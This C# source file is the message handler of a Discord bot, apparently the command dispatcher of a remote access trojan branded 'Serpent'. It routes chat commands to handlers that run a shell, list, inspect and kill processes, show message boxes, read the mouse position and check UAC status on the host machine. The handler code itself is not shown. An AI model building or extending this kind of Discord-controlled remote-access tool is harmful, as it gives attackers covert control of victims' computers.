using System;
using Commands;
using Discord;
using Discord.Webhook;
using Discord.WebSocket;
using Helper;




namespace Events
{

    
    

    public static class Messaging {
    private static string Prefix = ";";

    
    public static async Task MessageReceive(SocketMessage Msg) {

        SocketUserMessage? Message = Msg as SocketUserMessage;
        
        if (Message.Author.IsBot) return;
        if (Message.Content.StartsWith(Prefix)) {
            string[] FullCommand = Message.Content[Prefix.Length..].Split(" ");
            string CommandName = FullCommand[0];
            
            string JointArgs = string.IsNullOrEmpty(string.Join(" ",FullCommand[1..])) ? "None" : string.Join(" ",FullCommand[1..]);

            switch (CommandName.ToLower()) {

                case "help":

                Commands.HelpCmd.Run(Message,FullCommand[1..]);
                break;

                
                case "shell":
                Commands.Shell.Run(Message,FullCommand[1..]);

                
                break;

                case "processes" or "ps":

                Commands.ZProcesses.Run(Message,FullCommand[1..]);

                break;


                case "psinfo":

                Commands.PsInfo.Run(Message,FullCommand[1..]);


                break;

                case "crash":
               // Commands.Crash.Run(Message,FullCommand[1..]);

                break;

                case "msgbox":

                Commands.Messagebox.Run(Message,FullCommand[1..]);
                break;

                case "mousepos":
                Commands.CPos.Run(Message,FullCommand[1..]);

                break;

                case "kill":

                Commands.Kill.Run(Message,FullCommand[1..]);
                break;

                case "uaccheck":
                Commands.UACCheck.Run(Message,FullCommand[1..]);
                break;

                

                default:

                Embed Embed = new SerpentEmbed().GetEmbed(SerpentEmbeds.Error,"Invalid Command!" , $"Command : ``{CommandName}`` Not Found.");
                await Message.Channel.SendMessageAsync(embed : Embed);
                break;
            }
            
            
        }
        
    }



  
    


};

    
}
